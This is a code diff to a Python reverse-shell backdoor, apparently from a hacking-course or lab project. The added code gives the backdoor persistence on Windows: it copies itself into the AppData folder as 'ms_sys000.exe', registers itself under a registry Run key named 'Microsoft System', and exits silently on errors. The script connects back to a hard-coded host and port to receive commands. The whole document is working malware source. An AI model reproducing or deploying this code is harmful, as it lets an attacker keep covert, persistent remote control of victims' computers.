@@ -8,12 +8,22 @@ import os
 import socket
 import subprocess
 import sys
+import shutil
 
 
 class Backdoor:
     def __init__(self, ip_addr, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip_addr, port))
+
+    def become_persistent(self):
+        malicious_file_location = os.environ["appdata"] + "\\ms_sys000.exe"
+        if not os.path.exists(malicious_file_location):
+            shutil.copyfile(sys.executable, malicious_file_location)  # Use __file__ instead if using raw .py file.
+            # TODO: Consider changing f-strings in the whole project to basic concatenation for backward compatibility.
+            subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
+                            f'/v Microsoft System /t REG_SZ /d "{malicious_file_location}"', shell=True)
 
     def reliable_send(self, data: str):
         if isinstance(data, bytes):
@@ -68,5 +78,8 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-backdoor = Backdoor("10.0.2.15", 4444)
-backdoor.run()
+try:
+    backdoor = Backdoor("10.0.2.15", 4444)
+    backdoor.run()
+except Exception:
+    sys.exit()
